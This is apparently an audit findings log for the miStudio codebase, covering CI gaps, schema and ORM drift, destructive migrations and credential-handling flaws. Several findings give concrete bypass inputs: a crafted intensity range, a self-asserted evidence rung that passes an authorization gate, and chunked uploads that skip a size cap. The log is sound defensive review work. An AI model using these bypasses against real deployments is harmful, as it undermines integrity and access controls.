- **Claim:** Lint is red on a clean `main` and has been for long enough that a Rules-of-Hooks violation (MIS-E2E-023) sat in shipped code through a three-round review. Errors by rule: `no-unused-vars` 15, `no-unsafe-function-type` 5, `no-useless-catch` 3, `no-useless-escape` 3, `no-constant-binary-expression` 2, **`react-hooks/rules-of-hooks` 2**, `no-require-imports` 2, `no-array-constructor` 1, `prefer-const` 1.
- **Failure scenario:** The one error class that is a genuine runtime bug is buried in 33 others and 494 warnings, so nobody reads the output. A gate that is always red is not a gate.
- **Evidence:** verified-by-live-repro (`npx eslint .` on clean `main`, exit 1)
- **Doc reference:** PADR coding standards (ESLint Airbnb); `CLAUDE.md` "Before Any Commit" checklist
- **Verification (R3):** CONFIRMED at baseline — `.github/workflows/frontend-ci.yml` runs `type-check`, `build` and `test`, and **never runs `npm run lint`**. That is why the suite is green in CI while lint is red locally: nothing anywhere gates on it.
- **Proposed remediation:** Fix the 34 errors, then make lint blocking in CI. Ratchet the warnings separately (see MIS-E2E-021).
- **Effort:** M
- **Refuted sub-item:** the two `no-constant-binary-expression` errors are **not** defects. `ProgressBar.test.tsx:387` and `StatusBadge.test.tsx:294` deliberately rerender with a literal `{false && <Component/>}` to assert the element unmounts. The assertion is real; only the lint rule is wrong about it. Recorded so a later round does not re-raise them.

---

### MIS-E2E-025 — CI excludes 329 frontend tests that all pass
- **Phase / Round:** P00 / baseline
- **Source:** baseline measurement
- **Severity:** P1
- **Type:** test-gap
- **Location:** `.github/workflows/frontend-ci.yml:44-60`
- **Claim:** The CI test step excludes nine test files, with a comment saying they have "pre-existing failures where components were refactored but tests weren't updated". **All nine now pass.** A full local `npx vitest run` on clean `main` returns **65 files / 1211 tests / 1211 passed / 0 failed**, which includes all nine. Those nine carry **329 tests — 27% of the entire frontend suite** — and none of them gates a merge.
- **Failure scenario:** The excluded files cover `DatasetCard` (49 tests), `TrainingCard` (49), `ActivationExtractionConfig` (41), `ModelDownloadForm` (39), `DownloadForm` (37), `DatasetDetailModal` (35), `ModelCard` (34), `DatasetsPanel` (28) and `useTrainingWebSocket` (17) — the download forms that handle HF access tokens, the training card, and the WebSocket hook whose resubscribe bug this repo has already been bitten by once. A regression in any of them merges green. The exclusion was a temporary measure whose reason expired, and because CI stayed green nothing signalled that.
- **Evidence:** verified-by-live-repro — full local run passes 1211/1211; per-file `it(`/`test(` counts sum to 329; the workflow's exclude list read at `frontend-ci.yml:53-60`
- **Doc reference:** none
- **Verification (R3):** pending — re-run the exact CI command locally to confirm the excludes parse as intended and that removing them leaves CI green
- **Proposed remediation:** Delete the nine `--exclude` flags and the stale comment. If any file then fails in CI but not locally, that difference is itself the finding.
- **Effort:** S

---

### MIS-E2E-026 — One `:?` in Compose breaks every `docker compose` command
- **Phase / Round:** P00 / baseline
- **Source:** baseline measurement
- **Severity:** P2
- **Type:** bug
- **Location:** `docker-compose.yml:151` — `MCP_AUTH_TOKEN: ${MCP_AUTH_TOKEN:?set MCP_AUTH_TOKEN in .env to enable the MCP server}`
- **Claim:** `mcp-server` is profile-gated (`profiles: ["mcp"]`) so it does not start by default, but Compose evaluates `${VAR:?msg}` during **file interpolation**, before profile filtering. With no root `.env` — and there is none in the repo, only `.env.example` — *every* command against `docker-compose.yml` aborts. Measured: `docker compose ps`, `docker compose config --services` and `docker compose logs postgres` all fail, as does `docker compose up -d redis`.
- **Failure scenario:** A fresh clone cannot run any `docker compose` command against the main compose file, including read-only ones, and the error names a service the user never asked to start. The intent — "the MCP port must not open without a token" — is right; the mechanism is scoped wrongly.
- **Evidence:** verified-by-live-repro (three commands, all non-zero; `ls .env` → not found)
- **Doc reference:** `README.md` / `CLAUDE.md` startup instructions
- **Verification (R3):** pending
- **Proposed remediation:** Move the required-token check inside the `mcp` profile's own entrypoint, or use `${MCP_AUTH_TOKEN:-}` in the file and let the MCP server refuse to start on an empty token — which `server.py:105-110` already does correctly.
- **Effort:** S
- **Mitigating:** `start-mistudio.sh:229` uses `docker-compose.dev.yml`, which has no `:?` operator, so the documented startup path is unaffected. That is also why this has gone unnoticed.

---

### MIS-E2E-027 — Two API tests reach a real Redis and dispatch a real Celery task
- **Phase / Round:** P00 / baseline
- **Source:** baseline measurement
- **Severity:** P2
- **Type:** test-gap
- **Location:** `backend/tests/api/v1/endpoints/test_datasets.py::TestDownloadDataset::{test_download_dataset_success,test_download_dataset_with_access_token}`
- **Claim:** Both tests fail on a machine where Redis is not running, with `ConnectionRefusedError` raised from `celery.backends.redis.ResultConsumer` — so the endpoint under test dispatches a real Celery task to a real broker and then subscribes to its result channel. They are not unit tests; they are integration tests sitting in the unit path, and they depend on ambient infrastructure that nothing in the suite provisions or asserts.
- **Failure scenario:** The suite's pass/fail depends on what happens to be running on the developer's machine. Worse in the other direction: when Redis *is* up, these tests enqueue real work onto the same broker a live Celery worker may be consuming, so running the test suite can start an actual dataset download.
- **Evidence:** verified-by-live-repro — failed with Redis down, and the traceback names `redis.connection.Connection(host=localhost,port=6379)` and `celery/backends/redis.py:180 self._pubsub.subscribe(key)`
- **Doc reference:** PADR testing standards (unit vs integration separation); `pyproject.toml` markers `unit`/`integration`
- **Verification (R3):** pending — confirm against a re-run with Redis up
- **Proposed remediation:** Mock the task dispatch (the other endpoint tests do), or move both to `tests/integration/` and mark them `@pytest.mark.integration`.
- **Effort:** S

---

### MIS-E2E-028 — The deployed app reports its version as "unknown"
- **Phase / Round:** P00 / baseline
- **Source:** live probe
- **Severity:** P3
- **Type:** bug
- **Location:** `backend/src/api/v1/endpoints/version.py:9-19` (`_read_version`); `backend/Dockerfile:68` (`COPY --chown=mistudio:mistudio . .`); `VERSION` at repo root
- **Claim:** `GET /api/v1/version` on the live k8s deployment returns `{"version":"unknown","app":"miStudio"}`. `_read_version()` probes three candidate paths for a `VERSION` file and falls back to the literal string `"unknown"`. The Dockerfile's build context is `backend/`, and `VERSION` lives at the **repo root** — there is no `backend/VERSION` — so the file never enters the image. In the container the module sits at `/app/src/api/v1/endpoints/version.py`, so the three candidates resolve to `/VERSION`, `/app/VERSION` and `/app/src/VERSION`, none of which exists.
- **Failure scenario:** The endpoint that exists to answer "which build is this?" cannot answer it in the only environment where the question matters. Every deployed instance reports the same `"unknown"`, so a version check cannot distinguish a stale pod from a current one — and the fallback is a plausible-looking string rather than an error, so nothing surfaces the failure.
- **Evidence:** verified-by-live-repro — `curl http://k8s-mistudio.hitsai.local/api/v1/version` returns the literal above; `ls backend/VERSION` → not found; `cat VERSION` → `0.5.0`
- **Doc reference:** none
- **Verification (R3):** CONFIRMED at baseline
- **Proposed remediation:** Bake the version in at build time — a Docker `ARG`/`ENV` from the workflow, or a build step that copies `VERSION` into the context. Then make the fallback loud: returning `"unknown"` silently is what let this sit.
- **Effort:** S

---

## P01 — Data layer & migrations

---

### MIS-E2E-029 — A capture store over 2 GiB overflows a 32-bit column and strands the run
- **Phase / Round:** P01 / R1
- **Source:** /code-review high
- **Severity:** P1
- **Type:** bug
- **Location:** `backend/src/models/circuit_runs.py:52` (`bytes_total`, `events_total` declared `Integer`)
- **Claim:** `bytes_total` counts the size of a circuit-capture store in bytes and is a 32-bit `Integer`, so it caps at 2,147,483,647 (~2 GiB). A capture larger than that raises on the final commit.
- **Failure scenario:** The capture completes, all the work is done, and the last write fails with a numeric-overflow error. That poisons the SQLAlchemy session, so the task's own error handler — which needs the same session to mark the run failed — fails too. The run is left at `running` forever with `store_path` never set, and because nothing points at the directory, the multi-gigabyte store on disk is leaked with no owner. Per-token multi-layer SAE activations over a real corpus reach this size readily.
- **Evidence:** plausible (read-only) — the column type is verified; the overflow threshold is arithmetic; the session-poisoning consequence is inferred from the commit ordering
- **Doc reference:** PADR IDL-32 (position-carrying sparse capture)
- **Verification (R3):** pending
- **Proposed remediation:** `BigInteger` for both, with a migration. Separately, the error handler should use a fresh session so a poisoned one cannot swallow the failure record.
- **Effort:** S

---

### MIS-E2E-030 — The analysis cache blind-INSERTs against a unique constraint
- **Phase / Round:** P01 / R1
- **Source:** /code-review high
- **Severity:** P1
- **Type:** bug
- **Location:** `backend/src/services/analysis_service.py:866` (`_cache_analysis`); constraint `UNIQUE (feature_id, analysis_type)` in the migration
- **Claim:** `_cache_analysis` inserts a new cache row without an upsert or an existence check, while the database holds a unique constraint on `(feature_id, analysis_type)`. Cache rows carry a 7-day expiry but are **never pruned**, so the row from the first request is still present when the second one comes.
- **Failure scenario:** Two paths reach it. (1) A cached analysis passes its 7-day expiry: the read treats it as stale and recomputes, the write hits the surviving row, and the insert raises. (2) Two concurrent requests for the same feature race and the second insert raises. Either way logit lens, correlations and ablation return 500 **permanently** for that feature — the failure is sticky, because the row that causes it is never removed. A feature that worked yesterday stops working with no state change from the user.
- **Evidence:** plausible (read-only)
- **Doc reference:** PADR IDL-9 (NLP analysis for feature discovery)
- **Verification (R3):** **CONFIRMED IN PRODUCTION and FIXED (2026-08-23).** The user hit it on the live deployment: the Feature Detail modal's **Logit Lens** and **Correlations** tabs both returned `HTTP error! status: 500` for `feat_sae_20260726_174056_d1a4_00000`, while Examples and Token Analysis — which do not touch this cache — worked. Isolated by probing a feature that had never been analysed (`feat_sae_20260223_190441_03261`): it returned **200** on both tabs, proving the 500 is the stale-cache path and not the computation.
  Root cause exactly as predicted: `_get_cached_analysis` filters on `computed_at >= expiry_threshold`, so an expired row is invisible to the read and still present in the table; nothing prunes it; `_cache_analysis` then blind-INSERTs against `uq_feature_analysis_cache_feature_type`. Reproduced against a real Postgres schema — the second write raises `UniqueViolationError`.
  **Fixed:** `_cache_analysis` is now `pg_insert(...).on_conflict_do_update(...)`, which also gives the expiry the semantics it always implied (a stale entry is *replaced* by the recompute). Regression test `backend/tests/unit/test_analysis_cache_upsert.py`; negative control M25 reverted the upsert to the blind INSERT and **2 tests failed**.
- **Proposed remediation:** Postgres `ON CONFLICT (feature_id, analysis_type) DO UPDATE`. Add the missing prune for expired rows.
- **Effort:** S

---

### MIS-E2E-031 — Two unique constraints exist in the DB but not in the ORM, so tests run without them
- **Phase / Round:** P01 / R1
- **Source:** /code-review high
- **Severity:** P1
- **Type:** test-gap
- **Location:** `backend/src/models/feature_analysis_cache.py:42` (missing `UNIQUE (feature_id, analysis_type)`); `backend/src/models/feature.py` (missing `uq_features_extraction_neuron`)
- **Claim:** Both constraints are created by migrations and enforced in the real database. Neither is declared on the ORM model. The unit suite builds its schema with `Base.metadata.create_all()`, so **the tests run against a database that does not have these constraints**.
- **Failure scenario:** This is why MIS-E2E-030 has no failing test. A test that exercises `_cache_analysis` twice passes locally — the second insert simply succeeds, because the constraint that would reject it was never created. The suite is structurally incapable of catching this bug class, and it will stay incapable for any future constraint added by migration only. Fixtures agreeing by construction, in its purest form: the test schema and the production schema are different schemas.
- **Evidence:** plausible (read-only) — model definitions and migration DDL both read; the `create_all` path is confirmed in `conftest.py`
- **Doc reference:** PADR IDL-16 (Schema Validation Tooling)
- **Verification (R3):** **CONFIRMED — from `Base.metadata` itself**, which is the authority on what `create_all` builds:
  ```
  feature_analysis_cache: unique=NONE      # DB has uq_feature_analysis_cache_feature_type
  features:               unique=NONE      # DB has uq_features_extraction_neuron
  ```
  Both constraints exist in the live database (queried via `pg_constraint`) and neither is in the ORM, so the unit suite's schema provably lacks them.
- **FIXED (2026-08-23):** both constraints are now declared in `__table_args__` on `FeatureAnalysisCache` and `Feature`, so `create_all()` builds the same schema production has. This was a prerequisite for fixing MIS-E2E-030 — `ON CONFLICT` needs the constraint to exist wherever the tests run. Full backend suite green afterwards (2,883 collected, 0 failures), so nothing depended on the missing constraints.
- **Still outstanding:** the guard test that diffs `Base.metadata` against the migrated schema, so the next migration-only constraint cannot diverge silently. Two constraints are fixed; the *mechanism* that let them diverge is not.
- **Effort:** M

---

### MIS-E2E-032 — Startup schema validation checks 15 of 36 tables and passes on a broken database
- **Phase / Round:** P01 / R1
- **Source:** /code-review high
- **Severity:** P1
- **Type:** bug
- **Location:** `backend/src/db/schema_validator.py:18` (`REQUIRED_TABLES`)
- **Claim:** `REQUIRED_TABLES` is a hand-maintained list of 15 table names. The ORM defines 36. Every table added in the last year — `circuits`, `dismissed_operations`, `steering_record_runs`, `cluster_profiles`, `validation_manifests` and the rest — is unchecked. The validator logs **"Schema validation passed"** on a database missing all of them.
- **Failure scenario:** The mechanism exists specifically to catch a database that has not been migrated, and it reports success on exactly that database. Compounded by `main.py:60`, where a validation *failure* only logs a warning and lets startup continue — so the check is both incomplete and non-blocking. A pod serving against an unmigrated database starts cleanly and fails later, at request time, per feature.
- **Evidence:** verified-by-live-repro (list of 15 counted against 36 ORM tables)
- **Doc reference:** PADR IDL-16 (Schema Validation Tooling) — the IDL this directly implements
- **Verification (R3):** pending
- **Proposed remediation:** Derive `REQUIRED_TABLES` from `Base.metadata.tables` so it cannot drift — the same "derive from the registry, not a hand-list" rule the MCP reachability harness already applies. Then decide deliberately whether a missing table should be fatal at startup.
- **Effort:** S

---

### MIS-E2E-033 — The ORM declares three foreign keys the database does not have
- **Phase / Round:** P01 / R1
- **Source:** /security-review (migration audit) + direct DB verification
- **Severity:** P1
- **Type:** bug
- **Location:** `backend/src/models/feature.py:43` and `backend/src/models/extraction_job.py:42` (`ForeignKey("trainings.id", ondelete="CASCADE")`); `backend/src/models/feature.py:59-64` (`ForeignKey("labeling_jobs.id", ondelete="SET NULL")`); `backend/alembic/versions/j6k7l8m9n0o1_make_extraction_training_id_nullable.py:63-65`, `:84-86`
- **Claim:** Migration `j6k7l8m9n0o1` drops `extraction_jobs_training_id_fkey` and `features_training_id_fkey` and **no later migration re-creates them**. Separately, `features.labeling_job_id` was added by `6819dd3caeb3:81-84` as a plain indexed `String(255)` with **no `ForeignKeyConstraint` ever**. All three FKs are still declared on the ORM models.
- **Verified against the running database:**
  ```
  $ docker exec mistudio-postgres psql -U postgres -d mistudio -tA -c \
      "SELECT conname, conrelid::regclass FROM pg_constraint
       WHERE contype='f' AND conrelid::regclass::text IN ('features','extraction_jobs');"
  features_extraction_job_id_fkey    | features
  fk_features_external_sae_id        | features
  fk_extraction_jobs_external_sae_id | extraction_jobs
  ```
  `features.training_id`, `extraction_jobs.training_id` and `features.labeling_job_id` all **exist as columns** and **none of them carries a foreign key**. Three declared, zero present.
- **Failure scenario:** Production has no referential integrity on any of the three. A dangling `training_id` is insertable; deleting a labeling job leaves `features.labeling_job_id` pointing at nothing, and the `SET NULL` never fires because `ondelete=` is DDL-only — it does nothing without the constraint. Partially compensated by `TrainingService.delete_training` deleting children by hand and by ORM-level `cascade="all, delete-orphan"`, so ORM-mediated deletes still clean up; any raw-SQL or bulk path does not.
- **Why no test catches it:** the unit suite builds its schema with `Base.metadata.create_all()`, which reads the **ORM**. So the tests run against a database that *has* all three CASCADE/SET NULL constraints while production has none. The test schema and the production schema are different schemas — the same root cause as MIS-E2E-031, now confirmed on three more constraints.
- **Evidence:** **verified-by-live-repro** — DB queried directly; the sub-audit's own caveat ("I did not execute alembic upgrade head against a scratch database") is hereby discharged
- **Doc reference:** PADR IDL-16
- **Verification (R3):** **CONFIRMED from both ends.** The live database (via `pg_constraint`) carries two FKs on `features`; `Base.metadata` — what `create_all` builds for the tests — carries four:
  ```
  ORM (test schema):  external_sae_id→CASCADE, extraction_job_id→CASCADE,
                      labeling_job_id→SET NULL, training_id→CASCADE
  DB  (production):   fk_features_external_sae_id, features_extraction_job_id_fkey
  ```
  Combined with MIS-E2E-031, **one table's test schema differs from production in both directions at once**: it has two foreign keys production lacks, and lacks a unique constraint production has.
- **Proposed remediation:** Re-create the three constraints in a migration, or drop them from the ORM — but pick one. Then add the `Base.metadata` vs migrated-schema diff guard from MIS-E2E-031, which would have caught all five divergences at once.
- **Effort:** M

---

### MIS-E2E-034 — A circuit's dial escapes the ceiling its own published schema declares
- **Phase / Round:** P01 / R1
- **Source:** /security-review (schema audit)
- **Severity:** P1
- **Type:** bug
- **Location:** `docs/schemas/circuit-definition-v1.json` `#/$defs/CircuitBudget` L41-54; `backend/src/schemas/circuit_definition.py:163-185` (`_dial_within_range`)
- **Claim:** `intensity` declares `maximum: 2.0`. Its sibling `intensity_range` is a bare `array of number` — no `minItems`, no `maxItems`, no element bounds. `_dial_within_range` is a `mode="after"` validator that clamps by **assigning** `self.intensity = lo`, and the model has no `validate_assignment`, so the assignment bypasses the `le=2.0` field constraint entirely.
- **Failure scenario:** Verified empirically by the reviewer: `{"intensity": 1.0, "intensity_range": [8.0, 10.0]}` **passes `jsonschema.validate` against the published file**; after pydantic parsing `intensity == 8.0`; and the re-export then **fails the very schema miStudio ships** — *"8.0 is greater than the maximum of 2.0"*. `[-500,-400]` yields a negative dial of `-400.0`; `[1e9,1e9]` yields `1e9`. Reachable through `POST /circuits/import` → `CircuitService.create` → persisted to `circuits.budget` JSONB → re-exported by `to_definition`. So miStudio stores a dial 4× over its declared ceiling and publishes documents that violate its own contract.
- **Containment:** miLLM's mirror has `ge=0.0, le=2.0` (`millm/api/schemas/circuit.py:123`) and `millm/core/steering_range.py` intersects any authored range with `[0,2]`, so this does **not** produce overdrive on the serving path. The damage is miStudio-local integrity plus contract conformance. Related: `ProfileBudget.intensity_range` has **no validator at all** in either file — `[]`, `[1,2,3,4,5]`, `[10,-10]` all accepted.
- **Evidence:** verified-by-live-repro (reviewer executed `jsonschema.validate` and the pydantic round-trip)
- **Doc reference:** PADR IDL-33, IDL-37
- **Strengthened at P01 R1 (/review):** the code states the invariant it does not enforce. `_dial_within_range`'s own docstring reads *"The calibration guarantee ('a served dial cannot exceed the cliff') rests on `intensity_range` being the true envelope AND `intensity` sitting inside it."* It enforces the second half and assumes the first, while the published schema leaves `intensity_range` completely unbounded — so "the true envelope" can be `[8, 10]`. `circuit_service.py:370-373` then leans on it in turn: *"The intensity∈range invariant is now enforced by `CircuitBudget` itself, so `update()`'s contract validation catches any bad clamp for BOTH this and the sync path."* Two call sites delegate the guarantee to a validator whose own precondition is unchecked.
- **Verification (R3):** **CONFIRMED — reproduced independently.** Executed against the real contract and the real published file:
  ```
  published schema accepts {intensity:1.0, intensity_range:[8,10]}: YES
  pydantic result: intensity = 8.0        (field declares le=2.0)
  re-export FAILS its own published schema: 8.0 is greater than the maximum of 2.0
  intensity_range=[-500,-400] -> intensity = -400.0
  intensity_range=[1e9,1e9]   -> intensity = 1000000000.0
  ```
  A schema-valid document in, a schema-invalid document out, and the dial reaches 1e9 and -400.
- **Proposed remediation:** Bound `intensity_range` elements to `[0, 2]` with `minItems: 2, maxItems: 2` in the schema, **and** re-validate `intensity` after the clamp (or clamp to `min(lo, 2.0)`), so neither layer alone is load-bearing.
- **Effort:** S

---

### MIS-E2E-035 — The evidence rung is self-asserted by the imported document and nothing verifies it
- **Phase / Round:** P01 / R1
- **Source:** /security-review (schema audit)
- **Severity:** P1
- **Type:** security
- **Location:** `docs/schemas/circuit-definition-v1.json` `#/$defs/CircuitEdge/properties/rung` L407-410 and `validation_manifest_ref` L444-455; `backend/src/api/v1/endpoints/circuits.py` import path; `CircuitService.create`
- **Claim:** `rung` correctly **defaults** to `0` (mined, lowest). But nothing verifies a document that simply writes `"rung": 3`. `validation_manifest_ref` — the field that would let a consumer check the claim — is a free-form string that is **never dereferenced or verified**, in miStudio or in miLLM. On import, `CircuitService.create` sets `circuit.rung = int(defn.displayed_rung())` verbatim.
- **Failure scenario:** The evidence ladder is this product's central honesty mechanism, and the documented gate is *"a circuit below rung 2 is REFUSED unless you pass `acknowledge_unvalidated`"*. That gate reads a number the document asserts about itself. A hand-authored circuit-definition with `"rung": 3` and no manifest imports cleanly, displays as faithfulness-tested, and passes the activation gate — with no causal validation ever having been run. `effect_size` is likewise unbounded and unverified (accepted `9999.0`) and feeds the hazard quantification that steering strength is derived from.
- **Evidence:** verified-by-live-repro (reviewer confirmed `displayed_rung()` returns 3 for a hand-authored doc; grep confirms `validation_manifest_ref` has no dereferencing consumer)
- **Doc reference:** PADR IDL-33, IDL-35 (the evidence ladder as the product-wide claims model)
- **Verification (R3):** **CONFIRMED — verified without touching production.** `CircuitDefinitionV1.displayed_rung()` is `circuit_rung([e.rung for e in self.edges])`, and `circuit_rung` returns `min(int(r) for r in edge_rungs)`. Executed: `circuit_rung([3,3,3]) -> 3`. The MIN aggregation is a *good* conservative choice, but it aggregates values the document asserts about itself. Independently confirmed that **`validation_manifest_ref` is written and never read**: it is set at `circuit_service.py:183` and `circuit_intervention_service.py:512`, and neither `api/v1/endpoints/circuits.py` nor `circuit_service.py` so much as imports `ValidationManifest`. The product knows this — the MCP docstring at `mcp_server/tools/circuits.py:66` says *"validation_manifest_ref all null: the RUNG survives the export"*.
- **Proposed remediation:** On import, either resolve `validation_manifest_ref` and recompute the rung from the manifests actually present, or **clamp the imported rung to what the document can prove** and record the asserted value separately as a claim. A rung that cannot be checked should not be the thing a gate reads.
- **Effort:** M
- **Note:** this is a trust-boundary finding, not a memory-safety one. It is recorded as `security` because the rung is used as an authorization decision.

---

### MIS-E2E-036 — The circuit import size cap is skipped for chunked requests
- **Phase / Round:** P01 / R1
- **Source:** /security-review (schema audit)
- **Severity:** P2
- **Type:** bug
- **Location:** `backend/src/api/v1/endpoints/circuits.py:161-168`
- **Claim:** The guard reads `content_length = request.headers.get("content-length")` and only applies `MAX_IMPORT_BYTES` `if content_length:`. A chunked `Transfer-Encoding` request sends no `Content-Length`, so the cap never applies and the full body is parsed.
- **Failure scenario:** The cap is trivially bypassed by any client that streams. The cluster endpoint gets this right at `cluster_profiles.py:160` by measuring the **parsed** payload rather than trusting a header — that precedent exists in the same codebase and was not copied.
- **Evidence:** plausible (read-only) — the header-conditional is verified; not yet exercised against a chunked request
- **Doc reference:** none
- **Verification (R3):** pending — send a chunked oversized import to the live app
- **Proposed remediation:** Measure the parsed payload, as `cluster_profiles.py:160` already does.
- **Effort:** S

---

### MIS-E2E-037 — The calibration block is silently dropped on circuit import
- **Phase / Round:** P01 / R1
- **Source:** /security-review (schema audit)
- **Severity:** P1
- **Type:** bug
- **Location:** `backend/src/api/v1/endpoints/circuits.py:188-204`; `CircuitService.create` accepts `calibration` at `circuit_service.py:212`; the column exists at `models/circuit.py:48`
- **Claim:** The import handler builds the `CircuitService.create` kwargs without a `calibration` key. The service accepts one and the column exists — the field is simply not passed. The whole calibrated-band block (`onset`, `sweet_spot`, `cliff`, `probe_set`, and the `provisional` honesty marker) is lost on round-trip.
- **Failure scenario:** Export a calibrated circuit, import it back, and the calibration evidence is gone while `budget.intensity_range` still carries the clamped numbers it produced. The dial keeps the bounds; the measurement that justified them, and the `provisional` flag that says how much to trust them, do not survive. A consumer sees a clamped range with no visible basis — the honesty marker is exactly what is dropped. This also breaks the BR-013 round-trip property the contract claims.
- **Evidence:** plausible (read-only) — the missing key is verified by reading both the caller and the callee signature
- **Doc reference:** PADR IDL-37 (calibration carriage in the contract); 019_FPRD
- **Verification (R3):** **CONFIRMED at source.** `CircuitService.create` reads `data.get("calibration")` (`circuit_service.py:224`); the import endpoint's dict at `circuits.py:190-205` has no such key while passing every other contract field. The service is fully wired to carry it — `circuit_service.py:234` does `calibration=(defn.calibration.model_dump(...) if defn.calibration else None)`. One missing dict key on one path.
- **Confirmed as an IDL-conformance break at P01 R1 (/review):** IDL-37 clause 5 states the reason the block exists — *"the probe set travels in the contract so a one-shot re-verify at serve time is cheap."* Dropping `calibration` on import means the probes do not travel, so the cheap re-verify the decision was written to enable is not possible for any imported circuit. Clause 4's other two requirements **do** conform: `circuit_service.py:375-376` sets `budget["intensity_range"] = [onset, cliff]` and `budget["intensity"] = sweet`, exactly as the IDL specifies. So the write path implements the decision and the read path discards it.
- **Verification (R3):** pending — export → import → export a calibrated circuit against the live app and diff
- **Proposed remediation:** Pass `calibration=defn.calibration`. Then add a **round-trip equality test** over the whole document, which is the guard that would have caught this and will catch the next dropped field.
- **Effort:** S

---

### MIS-E2E-038 — A data-cleanup migration deletes every occurrence of a common word, irreversibly
- **Phase / Round:** P01 / R1
- **Source:** /security-review (migration audit)
- **Severity:** P1
- **Type:** bug
- **Location:** `backend/alembic/versions/678f7e8bbeb6_cleanup_duplicate_prime_tokens.py:77`, `:84`
- **Claim:** The migration intends to remove **one** erroneously duplicated copy of the prime token from a feature's context window. It is written as `new_prefix = [t for t in prefix_tokens if t != prime_token]`, which removes **every** occurrence of that token string from both `prefix_tokens` and `suffix_tokens`.
- **Failure scenario:** Prime tokens are frequently common words — ` the`, ` of`, ` in`, or a repeated content word. Every legitimate second occurrence in the surrounding context is silently deleted from every affected row of `feature_activations`. Two aggravating factors: (1) `prime_activation_index` is a **positional index into that same context** and is not recomputed, so removing prefix elements shifts every position after it — and that index is read straight into labeling prompts at `labeling_service.py:280,365,456`, so a mis-indexed context feeds the LLM that writes the feature's label; (2) lines 74-75 write `None` when the filtered list is empty, turning `[]` into SQL `NULL`. `downgrade()` is an explicit no-op whose own comment says *"the original corrupt data cannot be reconstructed."*
- **Evidence:** plausible (read-only) — the over-broad filter is unambiguous in the code; the index-desync consequence is inferred from the ordering
- **Doc reference:** PADR IDL-9; the span-highlighting work (`context_parts`)
- **Verification (R3):** pending — query `feature_activations` for rows whose `prime_activation_index` exceeds `len(prefix_tokens)`, which would be direct evidence the desync happened
- **Proposed remediation:** Already-run migration, so the fix is forward: detect and repair desynced rows, and re-derive contexts where possible. Record the data loss honestly rather than leaving it implicit.
- **Effort:** M

---

### MIS-E2E-039 — A downgrade deletes all user tokenizations under a comment claiming it deletes none
- **Phase / Round:** P01 / R1
- **Source:** /security-review (migration audit)
- **Severity:** P2
- **Type:** bug
- **Location:** `backend/alembic/versions/2e1feb9cc451_migrate_existing_tokenizations_to_new_.py:131-148`
- **Claim:** The downgrade runs `DELETE FROM dataset_tokenizations WHERE dataset_id IN (SELECT id FROM datasets WHERE tokenized_path IS NOT NULL)`. Its docstring says *"This only removes records that were created by this migration. Any tokenizations created after this migration won't be affected."* There is no marker column distinguishing migration-created rows, so that is false: it deletes **every** tokenization for any dataset with a non-null `tokenized_path`, and the table is keyed per `(dataset_id, model_id, max_length)` — so all of a user's later work for that dataset goes.
- **Failure scenario:** Run standalone or out of order, it destroys user data while the comment tells the operator it is safe. Run in the real chain, the child revision `7282abcac53a` downgrades first and re-adds `tokenized_path` as an empty nullable column, so `IS NOT NULL` matches nothing and the delete is a silent no-op. Either destructive or useless — and the accompanying *"safe downgrade since the data still exists in the datasets table"* is wrong in both cases.
- **Evidence:** plausible (read-only)
- **Doc reference:** none
- **Verification (R3):** pending
- **Proposed remediation:** Make the downgrade refuse rather than guess, or mark migration-created rows so the claim can be true.
- **Effort:** S

---

### MIS-E2E-040 — A schema migration drops four data-bearing columns without copying them
- **Phase / Round:** P01 / R1
- **Source:** /security-review (migration audit)
- **Severity:** P2
- **Type:** bug
- **Location:** `backend/alembic/versions/c8c7653233ee_update_models_table_schema.py:34-35` (adds), `:96-100` (drops)
- **Claim:** The upgrade adds `memory_required_bytes` (BigInteger) and `architecture_config` (JSONB), then drops `memory_req_bytes`, `extra_metadata`, `hidden_dim` and `num_heads` — with **no `UPDATE` copying values across**. `memory_req_bytes` → `memory_required_bytes` is a pure rename that loses its data; `extra_metadata` (JSONB) is dropped with `architecture_config` left NULL.
- **Failure scenario:** Any model row that had those values lost them at upgrade time. Historical, so the loss has already happened; recorded because it is unrecoverable and because the same pattern would repeat. The downgrade is separately unusable — `:145` narrows `file_path` 1000→512 and `:168` narrows `name` 500→255 (Postgres raises rather than truncating), `:172` converts `id` String→UUID with no `USING`, and `:126` re-adds `extra_metadata` as `nullable=False` with no default.
- **Evidence:** plausible (read-only)
- **Doc reference:** none
- **Verification (R3):** pending — check whether any current `models` row has a NULL `architecture_config` that should have had content
- **Proposed remediation:** Forward-only. Record the loss; add a review rule that a drop paired with an add in the same migration must carry an explicit copy or an explicit "no data to preserve" note.
- **Effort:** S

---

### MIS-E2E-041 — Plaintext OpenAI keys can persist forever, and decryption is built to hide it
- **Phase / Round:** P01 / R1
- **Source:** /security-review (migration audit)
- **Severity:** P1
- **Type:** security
- **Location:** `backend/alembic/versions/6819dd3caeb3_create_labeling_jobs_table.py:41` (`openai_api_key` as plain `String(500)`); `backend/src/services/labeling_service.py:191` (service-layer `encrypt_value`, added later); `backend/src/core/encryption.py:62-92` (`decrypt_value`)
- **Claim:** The credential column was created plaintext and encryption was added later, at the service layer only. **No migration ever encrypts pre-existing rows.** And `decrypt_value` fails open by design — its own docstring says it *"returns the value as-is… This handles rows that were saved plaintext under an earlier code path despite being flagged is_sensitive."*
- **Failure scenario:** Any `labeling_jobs` row written before the service-layer encryption landed still holds a plaintext OpenAI API key. Because `decrypt_value` returns unrecognised input unchanged, that row **works perfectly** — the application reads the plaintext key, uses it, and nothing anywhere flags that it was never encrypted. The fail-open behaviour is what makes the gap permanent: there is no code path that can ever notice. The same swallow also hides `InvalidTag` (MIS-E2E-004), so the two findings share a root cause and should be fixed together.
- **Evidence:** verified-by-live-repro for the absence of a backfill (grepped the whole versions tree); plausible for live exposure, which depends on row age
- **Doc reference:** PADR IDL-20 (AES-256-GCM), IDL-25
- **Verification (R3):** pending — query `labeling_jobs` for non-null `openai_api_key` values that do not base64-decode to a valid envelope; that count is the exposure
- **Proposed remediation:** Add a backfill that encrypts or nulls legacy rows, and make `decrypt_value` distinguish "not an envelope" (legacy — return as-is, but **log a counter**) from `InvalidTag` (raise). The counter is what turns an invisible gap into a fixable one.
- **Effort:** M
- **Related:** MIS-E2E-004

---

### MIS-E2E-042 — Extra keys in `meta` are persisted unbounded and re-exported
- **Phase / Round:** P01 / R1
- **Source:** /security-review (schema audit)
- **Severity:** P2
- **Type:** security
- **Location:** `docs/schemas/{circuit,cluster}-definition-v1.json` — `MemberMeta` and `MemberExample` set `additionalProperties: true`; `CircuitEdge.type_signals` likewise
